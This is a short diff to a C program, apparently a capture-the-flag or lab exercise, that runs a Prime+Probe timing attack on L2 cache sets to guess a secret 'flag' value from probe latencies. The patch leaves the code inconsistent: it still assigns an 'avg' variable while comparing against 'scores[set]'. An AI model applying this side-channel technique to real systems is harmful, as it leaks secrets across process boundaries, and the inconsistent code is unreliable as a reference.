@@ -74,14 +74,14 @@ int main() {
 
         
         int perm[NUM_L2_CACHE_SETS];
-        
-        for(int r = 0; r < REPEATS; r++) {
 
-            
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
+        for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
                 perm[i] = i;
 
             shuffle(perm);
+
+        for(int r = 0; r < REPEATS; r++) {
+
 
             /* PRIME all sets */
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
@@ -104,7 +104,7 @@ int main() {
 
                 uint64_t latency = rdtsc() - start;
 
-                score[set] += latency;
+                scores[set] += latency;
             }
         }
 
@@ -112,13 +112,13 @@ int main() {
         uint64_t best_latency = 0;
 
         for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-            if(avg > best_latency) {
+            if(scores[set] > best_latency) {
                 best_latency = avg;
                 best_set = set;
             }
         }
 
-        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
+        printf("Guessed flag: %d (score=%lu)\n", best_set, best_latency);
 
         wait_cycles(10000);
     }
